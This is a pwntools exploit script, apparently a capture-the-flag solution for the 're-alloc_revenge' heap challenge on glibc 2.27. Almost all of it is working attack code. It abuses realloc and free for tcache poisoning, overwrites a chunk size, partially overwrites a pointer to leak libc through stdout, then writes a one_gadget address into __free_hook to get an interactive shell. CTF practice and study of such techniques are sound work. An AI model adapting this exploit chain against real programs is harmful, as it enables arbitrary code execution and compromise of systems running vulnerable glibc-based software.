from pwn import *
import sys

e = ELF("./re-alloc_revenge", False)
l = ELF("/lib/x86_64-linux-gnu/libc-2.27.so", False)

def choose(option):
	io.sendlineafter("Your choice: ", str(option))
def indexOf(idx):
	io.sendlineafter("Index:", str(idx))
def sizeOf(size):
	io.sendlineafter("Size:", str(size))
def dataOf(data):
	io.sendafter("Data:", str(data))

def realloc(idx, size, data):
	choose(2)
	indexOf(idx)
	sizeOf(size)
	if size > 0:
		dataOf(data)
def alloc(idx, size, data):
	choose(1)
	indexOf(idx)
	sizeOf(size)
	if size > 0:
		dataOf(data)
def free(idx):
	choose(3)
	indexOf(idx)

n = 16

while n > 0:
	n -= 1
	try:
		io = process("./re-alloc_revenge")
		# tc(0x70) = A, size(A) = 0x20, tc(0x50) = remain_A
		alloc(0, 0x60, 'AAAA')
		realloc(0, 0, '')
		realloc(0, 0x10, 'AAAA')
		free(0)

		for i in range(8): # 0x400
			alloc(0, 0x70, 'XXXX')
			realloc(0, 0x30, 'XXXX')
			free(0)
		# chunk next(0x450) to avoid corrupted chunks
		alloc(0, 0x70, 'XXXX')
		free(0)

		# two places reference to remain_A -> tc(0x50), tc(0x30)
		alloc(0, 0x40, 'AAAA')
		realloc(0, 0, '')
		realloc(0, 0x20, 'AAAA')
		free(0)

		# overwite size of next chunk
		alloc(1, 0x60, p64(0)*2 + p64(0) + p64(0x451))
		free(1)

		# 0 -> unsorted_chunk
		alloc(0, 0x40, 'BBBB')
		realloc(0, 0, '')
		# overwrite partial -> stdout
		realloc(0, 0x70, p16(0xc760))

		alloc(1, 0x20, 'XXXX')
		free(1)

		alloc(1, 0x20, p64(0xfbad1800) + p64(0)*3)
		
		buf = io.recvuntil("$$$$")[:-4]
		if len(buf) == 0:
			io.close()
			continue
		libc_at = u64(buf[8:16]) - 0x3ed8b0
		hook_at = libc_at + l.symbols['__free_hook']
		system_at = libc_at + l.symbols['system']
		og = libc_at + 0x4f322		
	
		print "libc_at {}".format(hex(libc_at))
		print "hook_at {}".format(hex(hook_at))
		print "system_at {}".format(hex(system_at))

		break
	except:
		io.close()

if n == 0:
	sys.exit(1)
# 0 -> chunksize 0x80
realloc(0, 0, '')
realloc(0, 0x10, 'AAAA')
free(0)

alloc(0, 0x70, p64(0)*2 + p64(0) + p64(0x21) + p64(hook_at) + p64(0)*3 + p64(0) + p64(0x21))
free(0)

alloc(0, 0x50, 'AAAA')
free(0)

alloc(0, 0x50, p64(og))
free(0)
io.interactive()	
